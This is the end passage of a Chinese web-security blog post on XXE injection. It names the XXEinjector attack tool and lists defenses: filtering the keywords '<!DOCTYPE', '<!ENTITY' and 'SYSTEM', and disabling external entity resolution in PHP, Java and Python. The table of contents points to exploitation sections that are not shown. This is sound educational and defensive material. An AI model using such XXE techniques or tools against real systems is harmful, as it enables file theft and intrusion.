+<h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p>XXEinjector:<code>https://github.com/enjoiz/XXEinjector/</code></p>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p><code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>等</p>
+<h3 id="禁用外部实体的方法"><a href="#禁用外部实体的方法" class="headerlink" title="禁用外部实体的方法"></a>禁用外部实体的方法</h3><p>PHP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>JAVA</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactorydbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Python</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a href="https://mp.weixin.qq.com/s/Kr2o-sSnAkSoyKRpjjK2yg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Kr2o-sSnAkSoyKRpjjK2yg</a></li>
+<li><a href="https://xz.aliyun.com/t/3357#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-12</a></li>
+<li><a href="https://mp.weixin.qq.com/s/z1lMdSFVTXTNkyMuXsa_9g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z1lMdSFVTXTNkyMuXsa_9g</a></li>
+<li><a href="https://blog.csdn.net/u012991692/article/details/80866826" target="_blank" rel="noopener">https://blog.csdn.net/u012991692/article/details/80866826</a></li>
+<li><a href="https://www.jianshu.com/p/3779001f0d27" target="_blank" rel="noopener">https://www.jianshu.com/p/3779001f0d27</a></li>
+<li><a href="https://mp.weixin.qq.com/s/ur4CpzbXX-CthK4aMKC7AQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ur4CpzbXX-CthK4aMKC7AQ</a></li>
+<li><a href="https://mp.weixin.qq.com/s/-Cnb4KSGEQ-HujNTHUI07w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-Cnb4KSGEQ-HujNTHUI07w</a></li>
+<li><a href="https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA</a></li>
+<li><a href="https://mp.weixin.qq.com/s/uVabONNWXUEF8AwumAVUOw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uVabONNWXUEF8AwumAVUOw</a></li>
+</ol>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-05-02T16:00:36.576Z" itemprop="dateUpdated">2021-05-03 00:00:36</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/05/02/XXE/" target="_blank" rel="external">http://wisejay.xyz/2021/05/02/XXE/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.xyz">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/05/02/XXE/&title=《web安全-XXE》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/05/02/XXE/&title=《web安全-XXE》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2021/03/22/CNVD-2021-10543/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#XXE"><span class="post-toc-number">1.</span> <span class="post-toc-text">XXE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XML结构"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">XML结构</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DTD实体"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">DTD实体</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#内部实体"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">内部实体</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#外部实体"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">外部实体</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#参数实体"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">参数实体</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XXE检测"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">XXE检测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#环境"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检测"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">检测</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XXE利用"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">XXE利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#协议"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">协议</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#读取任意文件"><span class="post-toc-number">1.5.2.1.</span> <span class="post-toc-text">读取任意文件</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#执行系统命令"><span class="post-toc-number">1.5.2.2.</span> <span class="post-toc-text">执行系统命令</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#探测内网端口"><span class="post-toc-number">1.5.2.3.</span> <span class="post-toc-text">探测内网端口</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#拒绝服务攻击"><span class="post-toc-number">1.5.2.4.</span> <span class="post-toc-text">拒绝服务攻击</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XXE进阶"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">XXE进阶</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CDATA使用"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">CDATA使用</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#无回显利用"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">无回显利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过方法"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">绕过方法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#测试工具"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">测试工具</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御方法"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">防御方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#过滤关键字"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">过滤关键字</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#禁用外部实体的方法"><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">禁用外部实体的方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考链接"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">参考链接</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/05/02/XXE/&title=《web安全-XXE》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/05/02/XXE/&title=《web安全-XXE》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABxUlEQVR42u3azYqFMAwGUN//pZ3twKB+SWyR4XR1uag9ugj56XHE6/y1qlde3Zs8rblwcXHH3PN2/X30FeV++/sXSAy4uLj7ufkGc9z9J3iw4eLifpI7yUZwcXH/HzfB5a+Hi4v7fW5S/CRlT5IMbarVcHFxB9w8WVn3e0l/FxcXt8U9B2syJmnuiIuLu4VbDTqTFuo8ncLFxd3DnYAevsHtP9Vy6Jh/P1xc3Nr5qEJzs9ryWHGMAxcXdzW3enPe4sxfozDIwcXF3cjNE47J9r0U57WbcXFxB9xelpTfNWq84uLibuTmx6p6TZNJMlQufnBxccfcaiNjfsqj+sIP0RcXF3cZNzpCHZQxhQ2K9MI3wMXFHXOrjctJ63NSFOHi4u7k9gYneUjKW6WFUIiLi7uYm4eeXtOz2vJ4oOPi4m7h5he9lqDEpdfljri4uIu5vYFHnqb0xrHlIQouLu6r3NdiYavqWjewwcXFnXPz4FWdzCSlUX5ICxcXdz+32aQIhi69aBqdJsPFxf0AtzdomQTNUSDDxcXdwk3CTd5arT4ZFxd3P7dX/CQtkny82jxNhouLu4CblyLlQqXVNOk9DRcX9yXuD0ToJQus7ILFAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
